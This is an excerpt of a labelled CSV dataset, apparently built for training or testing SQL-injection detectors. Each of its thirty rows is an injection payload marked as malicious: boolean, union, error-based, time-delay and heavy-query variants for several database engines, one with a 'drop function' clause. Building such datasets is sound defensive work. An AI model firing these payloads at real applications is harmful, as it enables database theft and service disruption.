row_index,payload_norm,label,sqli_type_hint
9150,"1, ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 9693 = 9693,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",1,
9151,"1' ) where 2284 = 2284 and make_set ( 8403 = 8403,8899 ) --",1,
9152,-6014' ) ) or ( 9860 = 4848 ) *4848 and ( ( 'qtge' = 'qtge,1,
9153,select case when 4656 = 3716 then 1 else null end--,1,
9154,"1"" where 8571 = 8571",1,
9155,"1"" ) and 3732 = 3850 and ( ""edjv"" = ""edjv",1,
9156,end#,1,
9157,1' ) ) union all select null#,1,
9158,"1"" ) ) and 7656 = 5604 and ( ( ""zuhv"" = ""zuhv",1,
9159,"1 ) ) as llnm where 6510 = 6510 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
9160,"1"" ) union all select null,null,null,null,null,null,null,null--",1,
9161,"1' ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( 'rnyb' = 'rnyb",1,
9162,1' in boolean mode ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1,
9163,"1 where 6095 = 6095 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
9164,1' ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( 'dtzt' like 'dtzt,1,
9165,1' where 9003 = 9003 waitfor delay '0:0:5'--,1,
9166,"-6639' ) as trll where 6271 = 6271 union all select 6271,6271,6271#",1,
9167,"1"" ) waitfor delay '0:0:5'--",1,
9168,"1"" and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ""cgps"" like ""cgps",1,
9169,end and ( ( ( 'gqhc' = 'gqhc,1,
9170,1' ) ) as wqhm where 9871 = 9871,1,
9171,"1"" ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ""rvuz"" like ""rvuz",1,
9172,-3458' ) where 2053 = 2053 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,1,
9173,select ( case when ( 2576 = 7563 ) then 2576 else 1/ ( select 0 ) end ) --,1,
9174,"select sleep ( 5 ) and ""irxg"" = ""irxg",1,
9175,select case when 8514 = 3207 then 1 else null end--,1,
9176,1 ) ) waitfor delay '0:0:5'--,1,
9177,"1"" ) ) as bovm where 5560 = 5560 union all select null,null,null,null,null,null,null#",1,
9178,"1"" ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
9179,if ( 8727 = 4039 ) select 8727 else drop function giql--,1,
